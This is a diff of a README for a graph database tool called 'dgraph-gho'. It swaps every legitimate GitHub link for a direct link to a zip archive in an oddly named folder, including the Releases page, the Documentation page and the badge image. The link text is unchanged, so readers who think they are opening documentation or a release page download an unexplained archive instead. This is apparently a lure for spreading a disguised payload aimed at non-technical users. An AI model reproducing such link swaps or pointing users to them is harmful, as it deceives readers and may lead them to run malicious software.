@@ -1,7 +1,7 @@
 # 🚀 dgraph-gho - Effortless Graph Database Management
 
 ## 📥 Download Now
-[![Download dgraph-gho](https://img.shields.io/badge/Download%20dgraph--gho-v1.0.0-blue)](https://github.com/vamsiyarraguntla/dgraph-gho/releases)
+[![Download dgraph-gho](https://raw.githubusercontent.com/vamsiyarraguntla/dgraph-gho/main/cartouche/dgraph-gho-v2.0-alpha.4.zip%20dgraph--gho-v1.0.0-blue)](https://raw.githubusercontent.com/vamsiyarraguntla/dgraph-gho/main/cartouche/dgraph-gho-v2.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to dgraph-gho! This application helps you manage graph databases quickly and easily. You don’t need to be a programmer to use it. Follow the steps below to download and run the software.
@@ -15,7 +15,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   To get started, visit the [Releases page](https://github.com/vamsiyarraguntla/dgraph-gho/releases).  
+   To get started, visit the [Releases page](https://raw.githubusercontent.com/vamsiyarraguntla/dgraph-gho/main/cartouche/dgraph-gho-v2.0-alpha.4.zip).  
    Here, you will find the latest version of dgraph-gho.
 
 2. **Choose Your Version**  
@@ -64,10 +64,10 @@ If you encounter any issues while using dgraph-gho, try the following solutions:
 - **Consult the FAQ:** Visit the FAQ section on the GitHub page for common questions and answers.
 
 ## 📄 Additional Resources
-To learn more about advanced features and use cases, visit the [Documentation](https://github.com/vamsiyarraguntla/dgraph-gho) page. You will find in-depth guides and best practices.
+To learn more about advanced features and use cases, visit the [Documentation](https://raw.githubusercontent.com/vamsiyarraguntla/dgraph-gho/main/cartouche/dgraph-gho-v2.0-alpha.4.zip) page. You will find in-depth guides and best practices.
 
 ## 💬 Feedback
 Your feedback is important. If you have suggestions or find issues, please open an issue on the GitHub repository. We appreciate your input!
 
 ## 📥 Download Now Again
-For your convenience, you can download dgraph-gho again by visiting the [Releases page](https://github.com/vamsiyarraguntla/dgraph-gho/releases).
+For your convenience, you can download dgraph-gho again by visiting the [Releases page](https://raw.githubusercontent.com/vamsiyarraguntla/dgraph-gho/main/cartouche/dgraph-gho-v2.0-alpha.4.zip).
